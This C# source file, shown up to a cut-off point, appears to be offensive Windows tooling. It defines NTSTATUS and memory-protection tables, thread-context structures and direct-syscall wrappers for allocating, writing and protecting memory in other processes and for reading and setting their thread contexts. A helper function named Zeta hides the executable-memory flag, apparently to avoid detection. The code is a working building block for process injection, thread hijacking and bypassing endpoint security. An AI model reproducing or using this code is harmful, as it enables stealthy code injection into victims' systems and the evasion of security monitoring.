using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Permissions;
using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.IO;

public class Code
{

	    public enum NTSTATUS : uint
	    {
	        Success = 0x00000000,
	        Wait0 = 0x00000000,
	        Wait1 = 0x00000001,
	        Wait2 = 0x00000002,
	        Wait3 = 0x00000003,
	        Wait63 = 0x0000003f,
	        Abandoned = 0x00000080,
	        AbandonedWait0 = 0x00000080,
	        AbandonedWait1 = 0x00000081,
	        AbandonedWait2 = 0x00000082,
	        AbandonedWait3 = 0x00000083,
	        AbandonedWait63 = 0x000000bf,
	        UserApc = 0x000000c0,
	        KernelApc = 0x00000100,
	        Alerted = 0x00000101,
	        Timeout = 0x00000102,
	        Pending = 0x00000103,
	        Reparse = 0x00000104,
	        MoreEntries = 0x00000105,
	        NotAllAssigned = 0x00000106,
	        SomeNotMapped = 0x00000107,
	        OpLockBreakInProgress = 0x00000108,
	        VolumeMounted = 0x00000109,
	        RxActCommitted = 0x0000010a,
	        NotifyCleanup = 0x0000010b,
	        NotifyEnumDir = 0x0000010c,
	        NoQuotasForAccount = 0x0000010d,
	        PrimaryTransportConnectFailed = 0x0000010e,
	        PageFaultTransition = 0x00000110,
	        PageFaultDemandZero = 0x00000111,
	        PageFaultCopyOnWrite = 0x00000112,
	        PageFaultGuardPage = 0x00000113,
	        PageFaultPagingFile = 0x00000114,
	        CrashDump = 0x00000116,
	        ReparseObject = 0x00000118,
	        NothingToTerminate = 0x00000122,
	        ProcessNotInJob = 0x00000123,
	        ProcessInJob = 0x00000124,
	        ProcessCloned = 0x00000129,
	        FileLockedWithOnlyReaders = 0x0000012a,
	        FileLockedWithWriters = 0x0000012b,
	        Informational = 0x40000000,
	        ObjectNameExists = 0x40000000,
	        ThreadWasSuspended = 0x40000001,
	        WorkingSetLimitRange = 0x40000002,
	        ImageNotAtBase = 0x40000003,
	        RegistryRecovered = 0x40000009,
	        Warning = 0x80000000,
	        GuardPageViolation = 0x80000001,
	        DatatypeMisalignment = 0x80000002,
	        Breakpoint = 0x80000003,
	        SingleStep = 0x80000004,
	        BufferOverflow = 0x80000005,
	        NoMoreFiles = 0x80000006,
	        HandlesClosed = 0x8000000a,
	        PartialCopy = 0x8000000d,
	        DeviceBusy = 0x80000011,
	        InvalidEaName = 0x80000013,
	        EaListInconsistent = 0x80000014,
	        NoMoreEntries = 0x8000001a,
	        LongJump = 0x80000026,
	        DllMightBeInsecure = 0x8000002b,
	        Error = 0xc0000000,
	        Unsuccessful = 0xc0000001,
	        NotImplemented = 0xc0000002,
	        InvalidInfoClass = 0xc0000003,
	        InfoLengthMismatch = 0xc0000004,
	        AccessViolation = 0xc0000005,
	        InPageError = 0xc0000006,
	        PagefileQuota = 0xc0000007,
	        InvalidHandle = 0xc0000008,
	        BadInitialStack = 0xc0000009,
	        BadInitialPc = 0xc000000a,
	        InvalidCid = 0xc000000b,
	        TimerNotCanceled = 0xc000000c,
	        InvalidParameter = 0xc000000d,
	        NoSuchDevice = 0xc000000e,
	        NoSuchFile = 0xc000000f,
	        InvalidDeviceRequest = 0xc0000010,
	        EndOfFile = 0xc0000011,
	        WrongVolume = 0xc0000012,
	        NoMediaInDevice = 0xc0000013,
	        NoMemory = 0xc0000017,
	        ConflictingAddresses = 0xc0000018,
	        NotMappedView = 0xc0000019,
	        UnableToFreeVm = 0xc000001a,
	        UnableToDeleteSection = 0xc000001b,
	        IllegalInstruction = 0xc000001d,
	        AlreadyCommitted = 0xc0000021,
	        AccessDenied = 0xc0000022,
	        BufferTooSmall = 0xc0000023,
	        ObjectTypeMismatch = 0xc0000024,
	        NonContinuableException = 0xc0000025,
	        BadStack = 0xc0000028,
	        NotLocked = 0xc000002a,
	        NotCommitted = 0xc000002d,
	        InvalidParameterMix = 0xc0000030,
	        ObjectNameInvalid = 0xc0000033,
	        ObjectNameNotFound = 0xc0000034,
	        ObjectNameCollision = 0xc0000035,
	        ObjectPathInvalid = 0xc0000039,
	        ObjectPathNotFound = 0xc000003a,
	        ObjectPathSyntaxBad = 0xc000003b,
	        DataOverrun = 0xc000003c,
	        DataLate = 0xc000003d,
	        DataError = 0xc000003e,
	        CrcError = 0xc000003f,
	        SectionTooBig = 0xc0000040,
	        PortConnectionRefused = 0xc0000041,
	        InvalidPortHandle = 0xc0000042,
	        SharingViolation = 0xc0000043,
	        QuotaExceeded = 0xc0000044,
	        InvalidPageProtection = 0xc0000045,
	        MutantNotOwned = 0xc0000046,
	        SemaphoreLimitExceeded = 0xc0000047,
	        PortAlreadySet = 0xc0000048,
	        SectionNotImage = 0xc0000049,
	        SuspendCountExceeded = 0xc000004a,
	        ThreadIsTerminating = 0xc000004b,
	        BadWorkingSetLimit = 0xc000004c,
	        IncompatibleFileMap = 0xc000004d,
	        SectionProtection = 0xc000004e,
	        EasNotSupported = 0xc000004f,
	        EaTooLarge = 0xc0000050,
	        NonExistentEaEntry = 0xc0000051,
	        NoEasOnFile = 0xc0000052,
	        EaCorruptError = 0xc0000053,
	        FileLockConflict = 0xc0000054,
	        LockNotGranted = 0xc0000055,
	        DeletePending = 0xc0000056,
	        CtlFileNotSupported = 0xc0000057,
	        UnknownRevision = 0xc0000058,
	        RevisionMismatch = 0xc0000059,
	        InvalidOwner = 0xc000005a,
	        InvalidPrimaryGroup = 0xc000005b,
	        NoImpersonationToken = 0xc000005c,
	        CantDisableMandatory = 0xc000005d,
	        NoLogonServers = 0xc000005e,
	        NoSuchLogonSession = 0xc000005f,
	        NoSuchPrivilege = 0xc0000060,
	        PrivilegeNotHeld = 0xc0000061,
	        InvalidAccountName = 0xc0000062,
	        UserExists = 0xc0000063,
	        NoSuchUser = 0xc0000064,
	        GroupExists = 0xc0000065,
	        NoSuchGroup = 0xc0000066,
	        MemberInGroup = 0xc0000067,
	        MemberNotInGroup = 0xc0000068,
	        LastAdmin = 0xc0000069,
	        WrongPassword = 0xc000006a,
	        IllFormedPassword = 0xc000006b,
	        PasswordRestriction = 0xc000006c,
	        LogonFailure = 0xc000006d,
	        AccountRestriction = 0xc000006e,
	        InvalidLogonHours = 0xc000006f,
	        InvalidWorkstation = 0xc0000070,
	        PasswordExpired = 0xc0000071,
	        AccountDisabled = 0xc0000072,
	        NoneMapped = 0xc0000073,
	        TooManyLuidsRequested = 0xc0000074,
	        LuidsExhausted = 0xc0000075,
	        InvalidSubAuthority = 0xc0000076,
	        InvalidAcl = 0xc0000077,
	        InvalidSid = 0xc0000078,
	        InvalidSecurityDescr = 0xc0000079,
	        ProcedureNotFound = 0xc000007a,
	        InvalidImageFormat = 0xc000007b,
	        NoToken = 0xc000007c,
	        BadInheritanceAcl = 0xc000007d,
	        RangeNotLocked = 0xc000007e,
	        DiskFull = 0xc000007f,
	        ServerDisabled = 0xc0000080,
	        ServerNotDisabled = 0xc0000081,
	        TooManyGuidsRequested = 0xc0000082,
	        GuidsExhausted = 0xc0000083,
	        InvalidIdAuthority = 0xc0000084,
	        AgentsExhausted = 0xc0000085,
	        InvalidVolumeLabel = 0xc0000086,
	        SectionNotExtended = 0xc0000087,
	        NotMappedData = 0xc0000088,
	        ResourceDataNotFound = 0xc0000089,
	        ResourceTypeNotFound = 0xc000008a,
	        ResourceNameNotFound = 0xc000008b,
	        ArrayBoundsExceeded = 0xc000008c,
	        FloatDenormalOperand = 0xc000008d,
	        FloatDivideByZero = 0xc000008e,
	        FloatInexactResult = 0xc000008f,
	        FloatInvalidOperation = 0xc0000090,
	        FloatOverflow = 0xc0000091,
	        FloatStackCheck = 0xc0000092,
	        FloatUnderflow = 0xc0000093,
	        IntegerDivideByZero = 0xc0000094,
	        IntegerOverflow = 0xc0000095,
	        PrivilegedInstruction = 0xc0000096,
	        TooManyPagingFiles = 0xc0000097,
	        FileInvalid = 0xc0000098,
	        InstanceNotAvailable = 0xc00000ab,
	        PipeNotAvailable = 0xc00000ac,
	        InvalidPipeState = 0xc00000ad,
	        PipeBusy = 0xc00000ae,
	        IllegalFunction = 0xc00000af,
	        PipeDisconnected = 0xc00000b0,
	        PipeClosing = 0xc00000b1,
	        PipeConnected = 0xc00000b2,
	        PipeListening = 0xc00000b3,
	        InvalidReadMode = 0xc00000b4,
	        IoTimeout = 0xc00000b5,
	        FileForcedClosed = 0xc00000b6,
	        ProfilingNotStarted = 0xc00000b7,
	        ProfilingNotStopped = 0xc00000b8,
	        NotSameDevice = 0xc00000d4,
	        FileRenamed = 0xc00000d5,
	        CantWait = 0xc00000d8,
	        PipeEmpty = 0xc00000d9,
	        CantTerminateSelf = 0xc00000db,
	        InternalError = 0xc00000e5,
	        InvalidParameter1 = 0xc00000ef,
	        InvalidParameter2 = 0xc00000f0,
	        InvalidParameter3 = 0xc00000f1,
	        InvalidParameter4 = 0xc00000f2,
	        InvalidParameter5 = 0xc00000f3,
	        InvalidParameter6 = 0xc00000f4,
	        InvalidParameter7 = 0xc00000f5,
	        InvalidParameter8 = 0xc00000f6,
	        InvalidParameter9 = 0xc00000f7,
	        InvalidParameter10 = 0xc00000f8,
	        InvalidParameter11 = 0xc00000f9,
	        InvalidParameter12 = 0xc00000fa,
	        MappedFileSizeZero = 0xc000011e,
	        TooManyOpenedFiles = 0xc000011f,
	        Cancelled = 0xc0000120,
	        CannotDelete = 0xc0000121,
	        InvalidComputerName = 0xc0000122,
	        FileDeleted = 0xc0000123,
	        SpecialAccount = 0xc0000124,
	        SpecialGroup = 0xc0000125,
	        SpecialUser = 0xc0000126,
	        MembersPrimaryGroup = 0xc0000127,
	        FileClosed = 0xc0000128,
	        TooManyThreads = 0xc0000129,
	        ThreadNotInProcess = 0xc000012a,
	        TokenAlreadyInUse = 0xc000012b,
	        PagefileQuotaExceeded = 0xc000012c,
	        CommitmentLimit = 0xc000012d,
	        InvalidImageLeFormat = 0xc000012e,
	        InvalidImageNotMz = 0xc000012f,
	        InvalidImageProtect = 0xc0000130,
	        InvalidImageWin16 = 0xc0000131,
	        LogonServer = 0xc0000132,
	        DifferenceAtDc = 0xc0000133,
	        SynchronizationRequired = 0xc0000134,
	        DllNotFound = 0xc0000135,
	        IoPrivilegeFailed = 0xc0000137,
	        OrdinalNotFound = 0xc0000138,
	        EntryPointNotFound = 0xc0000139,
	        ControlCExit = 0xc000013a,
	        PortNotSet = 0xc0000353,
	        DebuggerInactive = 0xc0000354,
	        CallbackBypass = 0xc0000503,
	        PortClosed = 0xc0000700,
	        MessageLost = 0xc0000701,
	        InvalidMessage = 0xc0000702,
	        RequestCanceled = 0xc0000703,
	        RecursiveDispatch = 0xc0000704,
	        LpcReceiveBufferExpected = 0xc0000705,
	        LpcInvalidConnectionUsage = 0xc0000706,
	        LpcRequestsNotAllowed = 0xc0000707,
	        ResourceInUse = 0xc0000708,
	        ProcessIsProtected = 0xc0000712,
	        VolumeDirty = 0xc0000806,
	        FileCheckedOut = 0xc0000901,
	        CheckOutRequired = 0xc0000902,
	        BadFileType = 0xc0000903,
	        FileTooLarge = 0xc0000904,
	        FormsAuthRequired = 0xc0000905,
	        VirusInfected = 0xc0000906,
	        VirusDeleted = 0xc0000907,
	        TransactionalConflict = 0xc0190001,
	        InvalidTransaction = 0xc0190002,
	        TransactionNotActive = 0xc0190003,
	        TmInitializationFailed = 0xc0190004,
	        RmNotActive = 0xc0190005,
	        RmMetadataCorrupt = 0xc0190006,
	        TransactionNotJoined = 0xc0190007,
	        DirectoryNotRm = 0xc0190008,
	        CouldNotResizeLog = 0xc0190009,
	        TransactionsUnsupportedRemote = 0xc019000a,
	        LogResizeInvalidSize = 0xc019000b,
	        RemoteFileVersionMismatch = 0xc019000c,
	        CrmProtocolAlreadyExists = 0xc019000f,
	        TransactionPropagationFailed = 0xc0190010,
	        CrmProtocolNotFound = 0xc0190011,
	        TransactionSuperiorExists = 0xc0190012,
	        TransactionRequestNotValid = 0xc0190013,
	        TransactionNotRequested = 0xc0190014,
	        TransactionAlreadyAborted = 0xc0190015,
	        TransactionAlreadyCommitted = 0xc0190016,
	        TransactionInvalidMarshallBuffer = 0xc0190017,
	        CurrentTransactionNotValid = 0xc0190018,
	        LogGrowthFailed = 0xc0190019,
	        ObjectNoLongerExists = 0xc0190021,
	        StreamMiniversionNotFound = 0xc0190022,
	        StreamMiniversionNotValid = 0xc0190023,
	        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
	        CantOpenMiniversionWithModifyIntent = 0xc0190025,
	        CantCreateMoreStreamMiniversions = 0xc0190026,
	        HandleNoLongerValid = 0xc0190028,
	        NoTxfMetadata = 0xc0190029,
	        LogCorruptionDetected = 0xc0190030,
	        CantRecoverWithHandleOpen = 0xc0190031,
	        RmDisconnected = 0xc0190032,
	        EnlistmentNotSuperior = 0xc0190033,
	        RecoveryNotNeeded = 0xc0190034,
	        RmAlreadyStarted = 0xc0190035,
	        FileIdentityNotPersistent = 0xc0190036,
	        CantBreakTransactionalDependency = 0xc0190037,
	        CantCrossRmBoundary = 0xc0190038,
	        TxfDirNotEmpty = 0xc0190039,
	        IndoubtTransactionsExist = 0xc019003a,
	        TmVolatile = 0xc019003b,
	        RollbackTimerExpired = 0xc019003c,
	        TxfAttributeCorrupt = 0xc019003d,
	        EfsNotAllowedInTransaction = 0xc019003e,
	        TransactionalOpenNotAllowed = 0xc019003f,
	        TransactedMappingUnsupportedRemote = 0xc0190040,
	        TxfMetadataAlreadyPresent = 0xc0190041,
	        TransactionScopeCallbacksNotSet = 0xc0190042,
	        TransactionRequiredPromotion = 0xc0190043,
	        CannotExecuteFileInTransaction = 0xc0190044,
	        TransactionsNotFrozen = 0xc0190045,
	        MaximumNtStatus = 0xffffffff
	};

	[Flags]
	public enum MemoryProtection : uint
	{
			AccessDenied = 0x0,
			Execute = 0x10,
			ExecuteRead = 0x20,
			ExecuteReadWrite = 0x40,
			ExecuteWriteCopy = 0x80,
			Guard = 0x100,
			NoCache = 0x200,
			WriteCombine = 0x400,
			NoAccess = 0x01,
			ReadOnly = 0x02,
			ReadWrite = 0x04,
			WriteCopy = 0x08,
			MEM_COMMIT = 0x00001000,
			MEM_RESERVE = 0x00002000
	}

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
  	const uint PAGE_EXECUTE_READWRITE = 0x40;

	  [Flags]
    public enum ThreadAccess : int
    {
      TERMINATE = (0x0001),
      SUSPEND_RESUME = (0x0002),
      GET_CONTEXT = (0x0008),
      SET_CONTEXT = (0x0010),
      SET_INFORMATION = (0x0020),
      QUERY_INFORMATION = (0x0040),
      SET_THREAD_TOKEN = (0x0080),
      IMPERSONATE = (0x0100),
      DIRECT_IMPERSONATION = (0x0200),
			THREAD_SUSPEND_RESUME_GET_CONTEXT_SET_CONTEXT = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_SUSPEND = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }

	public enum CONTEXT_FLAGS : uint
	{
	   CONTEXT_i386 = 0x10000,
	   CONTEXT_i486 = 0x10000,
	   CONTEXT_CONTROL = CONTEXT_i386 | 0x01,
	   CONTEXT_INTEGER = CONTEXT_i386 | 0x02,
	   CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04,
	   CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08,
	   CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10,
	   CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20,
	   CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
	   CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |  CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS |  CONTEXT_EXTENDED_REGISTERS
	}

	// x86 float save
	[StructLayout(LayoutKind.Sequential)]
	public struct FLOATING_SAVE_AREA
	{
		 public uint ControlWord;
		 public uint StatusWord;
		 public uint TagWord;
		 public uint ErrorOffset;
		 public uint ErrorSelector;
		 public uint DataOffset;
		 public uint DataSelector;
		 [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		 public byte[] RegisterArea;
		 public uint Cr0NpxState;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct M128A
	{
		 public ulong High;
		 public long Low;

		 public override string ToString()
		 {
		return string.Format("High:{0}, Low:{1}", this.High, this.Low);
		 }
	}

	// x64 save format
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct XSAVE_FORMAT64
	{
		public ushort ControlWord;
		public ushort StatusWord;
		public byte TagWord;
		public byte Reserved1;
		public ushort ErrorOpcode;
		public uint ErrorOffset;
		public ushort ErrorSelector;
		public ushort Reserved2;
		public uint DataOffset;
		public ushort DataSelector;
		public ushort Reserved3;
		public uint MxCsr;
		public uint MxCsr_Mask;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public M128A[] FloatRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public M128A[] XmmRegisters;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
		public byte[] Reserved4;
	}

	// x64 context structure
	[StructLayout(LayoutKind.Sequential, Pack = 16)]
	public struct CONTEXT64
	{
		public ulong P1Home;
		public ulong P2Home;
		public ulong P3Home;
		public ulong P4Home;
		public ulong P5Home;
		public ulong P6Home;

		public CONTEXT_FLAGS ContextFlags;
		public uint MxCsr;

		public ushort SegCs;
		public ushort SegDs;
		public ushort SegEs;
		public ushort SegFs;
		public ushort SegGs;
		public ushort SegSs;
		public uint EFlags;

		public ulong Dr0;
		public ulong Dr1;
		public ulong Dr2;
		public ulong Dr3;
		public ulong Dr6;
		public ulong Dr7;

		public ulong Rax;
		public ulong Rcx;
		public ulong Rdx;
		public ulong Rbx;
		public ulong Rsp;
		public ulong Rbp;
		public ulong Rsi;
		public ulong Rdi;
		public ulong R8;
		public ulong R9;
		public ulong R10;
		public ulong R11;
		public ulong R12;
		public ulong R13;
		public ulong R14;
		public ulong R15;
		public ulong Rip;

		public XSAVE_FORMAT64 DUMMYUNIONNAME;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
		public M128A[] VectorRegister;
		public ulong VectorControl;

		public ulong DebugControl;
		public ulong LastBranchToRip;
		public ulong LastBranchFromRip;
		public ulong LastExceptionToRip;
		public ulong LastExceptionFromRip;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct OSVERSIONINFOEXW
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
        public UInt16 wServicePackMajor;
        public UInt16 wServicePackMinor;
        public UInt16 wSuiteMask;
        public byte wProductType;
        public byte wReserved;
    }

		public struct STARTUPINFO
		{
				public int cb;
				public string lpReserved;
				public string lpDesktop;
				public string lpTitle;
				public int dwX;
				public int dwY;
				public int dwXSize;
				public int dwYSize;
				public int dwXCountChars;
				public int dwYCountChars;
				public int dwFillAttribute;
				public int dwFlags;
				public short wShowWindow;
				public short cbReserved2;
				public int lpReserved2;
				public IntPtr hStdInput;
				public IntPtr hStdOutput;
				public IntPtr hStdError;
		}

		public struct PROCESS_INFORMATION
		{
				public IntPtr hProcess;
				public IntPtr hThread;
				public int dwProcessId;
				public int dwThreadId;
		}

		[StructLayout(LayoutKind.Sequential,Pack=0)]
		public struct OBJECT_ATTRIBUTES
		{
		   public Int32 Length;
		   public IntPtr RootDirectory;
		   public IntPtr ObjectName;
		   public uint Attributes;
		   public IntPtr SecurityDescriptor;
		   public IntPtr SecurityQualityOfService;

		}

    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

		[Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

		[StructLayout(LayoutKind.Sequential, Pack=0)]
		public struct UNICODE_STRING
		{
		    public ushort Length;
		    public ushort MaximumLength;
		    public IntPtr Buffer;

		}

		[StructLayout(LayoutKind.Sequential)]
		public struct THREAD_BASIC_INFORMATION
		{
				public uint ExitStatus; // original: LONG NTSTATUS
				public uint TebBaseAddress; // original: PVOID
				public CLIENT_ID ClientId;
				public uint AffinityMask; // original: ULONG_PTR
				public uint Priority; // original: DWORD
				public uint BasePriority; // original: DWORD
		}

		private enum ThreadInfoClass : int
		{
				ThreadBasicInformation = 0,
				ThreadQuerySetWin32StartAddress = 9
		}

		public struct WIN_VER_INFO
		{
				public string chOSMajorMinor;
				public long dwBuildNumber;
				public UNICODE_STRING ProcName;
				public IntPtr hTargetPID;
				public string lpApiCall;
				public int SystemCall;
		}

		public static int Zeta()
		{
				Random number = new Random();
				int code = number.Next(100);
				int a, b;
				while ( code != 32)
				{
						code = number.Next(100);
				}
				a = code;
				code = number.Next(100);
				while ( code != 32)
				{
						code = number.Next(100);
				}
				b = code;
				return a + b;
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ProtectorX(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect );
		public static NTSTATUS Protector(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect)
		{
				IntPtr proc = GetLibraryAddress(@"C:\Windows\System32\ntdll.dll", "ZwProtectVirtualMemory", false);
				ProtectorX ProtectorFunc = (ProtectorX)Marshal.GetDelegateForFunctionPointer(proc, typeof(ProtectorX));
				return (NTSTATUS)ProtectorFunc( ProcessHandle, ref BaseAddress, ref RegionSize, NewProtect, ref OldProtect );
		}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwProtectVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten);
		public static NTSTATUS ZwProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 lpNumberOfBytesWritten, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 16, ref osVersionInfo  );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
                NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect);
                ZwProtectVirtualMemoryX ZwProtectVirtualMemoryFunc = (ZwProtectVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwProtectVirtualMemoryX));
                return (NTSTATUS)ZwProtectVirtualMemoryFunc( ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, ref lpNumberOfBytesWritten);
            }
        }
    }

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwWriteVirtualMemoryX(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);
		public static NTSTATUS ZwWriteVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 3, ref osVersionInfo  );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
                NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
                ZwWriteVirtualMemoryX ZwWriteVirtualMemoryFunc = (ZwWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWriteVirtualMemoryX));
                return (NTSTATUS)ZwWriteVirtualMemoryFunc(ProcessHandle, BaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
            }
        }
    }


		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwAllocateVirtualMemoryX( IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect );
		public static NTSTATUS ZwAllocateVirtualMemory( IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect, ref OSVERSIONINFOEXW osVersionInfo)
		{
				byte [] syscall = GetOSVersionAndReturnSyscall( 4, ref osVersionInfo  );
				unsafe
				{
						fixed (byte* ptr = syscall)
						{
								IntPtr allocMemAddress = (IntPtr)ptr;
								IntPtr allocMemAddressCopy = (IntPtr)ptr;
								UInt32 size = (uint)syscall.Length;
								IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
								ZwAllocateVirtualMemoryX ZwAllocateVirtualMemoryFunc = (ZwAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwAllocateVirtualMemoryX));
								return (NTSTATUS)ZwAllocateVirtualMemoryFunc(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);

						}
				}
		}


		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwGetContextThreadX( IntPtr ProcessHandle, ref CONTEXT64 context);
    public static NTSTATUS ZwGetContextThread( IntPtr ProcessHandle, ref CONTEXT64 context, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 12, ref osVersionInfo  );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
								ZwGetContextThreadX ZwGetContextThreadFunc = (ZwGetContextThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwGetContextThreadX));
                return (NTSTATUS)ZwGetContextThreadFunc(ProcessHandle, ref context);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwSetContextThreadX( IntPtr ProcessHandle, CONTEXT64 context);
    public static NTSTATUS ZwSetContextThread( IntPtr ProcessHandle, CONTEXT64 context, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 11, ref osVersionInfo  );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
                ZwSetContextThreadX ZwSetContextThreadFunc = (ZwSetContextThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwSetContextThreadX));
                return (NTSTATUS)ZwSetContextThreadFunc(ProcessHandle, context);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwCloseX( IntPtr ProcessHandle);
